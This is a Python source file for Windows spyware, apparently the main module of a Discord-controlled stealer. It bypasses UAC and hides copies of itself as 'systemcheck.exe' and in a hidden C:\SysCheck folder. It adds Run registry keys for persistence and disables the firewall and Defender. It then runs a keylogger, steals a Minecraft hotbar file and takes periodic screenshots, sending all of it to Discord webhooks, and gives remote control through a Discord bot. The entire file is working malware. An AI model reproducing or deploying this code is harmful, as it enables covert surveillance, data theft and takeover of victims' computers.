from PIL import ImageGrab
from .config import LoadsConfig
from discord_bot import bot
from core import keylogger, sender, turn_off_security
from winpwnage.functions.uac.uacMethod1 import uacMethod1
import time, os, sys, shutil, threading

config = LoadsConfig()
file_path = sys.executable

if os.path.exists("c:\\windows\\system32\\systemcheck.exe"):
	uacMethod1(['C:\\Windows\\system32\\cmd.exe', '/c', r'taskkill /f /im systemcheck.exe'])
	uacMethod1(['C:\\Windows\\system32\\cmd.exe', '/c', r'del c:\windows\system32\systemcheck.exe'])
if os.path.exists("c:\\SysCheck\\SysCheck.exe"):
	uacMethod1(['C:\\Windows\\system32\\cmd.exe', '/c', r'taskkill /f /im syscheck.exe'])
	uacMethod1(['C:\\Windows\\system32\\cmd.exe', '/c', r'del C:\\SysCheck\\SysCheck.exe'])

if os.path.dirname(file_path) != 'C:\\Windows\\System32':
	uacMethod1(['C:\\Windows\\system32\\cmd.exe', '/c', f"copy {file_path} c:\\windows\\system32\\systemcheck.exe"])
	uacMethod1(['C:\\Windows\\system32\\cmd.exe', '/c', f'reg add "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" /f /v systemcheck /t REG_SZ /d c:\\windows\\system32\\systemcheck.exe'])

if os.path.dirname(file_path) != "C:\\SysCheck":
	try:
		os.mkdir("C:\\SysCheck")
	except:
		pass
	os.system("attrib +s +h /d C:\\SysCheck")
	file_startup_path = f"C:\\SysCheck\\SysCheck.exe"
	shutil.copy(file_path, file_startup_path)
	uacMethod1(['C:\\Windows\\system32\\cmd.exe', '/c', f'reg add "HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" /f /v syscheck /t REG_SZ /d {file_startup_path}'])

Security = turn_off_security.TurnOffSecurity()
keylogger = keylogger.Keylogger()
sender = sender.Sender()

Security.FireWall()
Security.Defender()
keylogger.start()
sender.webhook_log_url = config['webhook']['keylog_url'] 
sender.webhook_info_url = config['webhook']['info_url']
sender.send_info()

global time_count, time_delay
time_count = time_delay = 60

def StealHotBar():
	hotbar = f"C:\\Users\\{os.getlogin()}\\AppData\\Roaming\\.minecraft\\hotbar.nbt"
	try:
		sender.send_file(hotbar, '**HotBar Stealer**')
	except:
		sender.send("Not Found HotBar", "HotBar Stealer")
StealHotBar()

def Send():
	snapshot = ImageGrab.grab()
	image_path = f"C:\\Users\\{os.getlogin()}\\AppData\\Local\\Temp\\sc.jpg"
	snapshot.save(image_path)
	sender.send(keylogger.log_text, image_path = image_path)
	keylogger.log_text = ''

def LogSend():
	global time_count, time_delay
	while True:
		Send()
		time.sleep(time_delay)

def BotControl():
	bot.client.run(config['bot']['token'])

log_send = threading.Thread(target = LogSend, daemon=True)
bot_th = threading.Thread(target = BotControl)
log_send.start()
bot_th.start()
log_send.join()
bot_th.join()
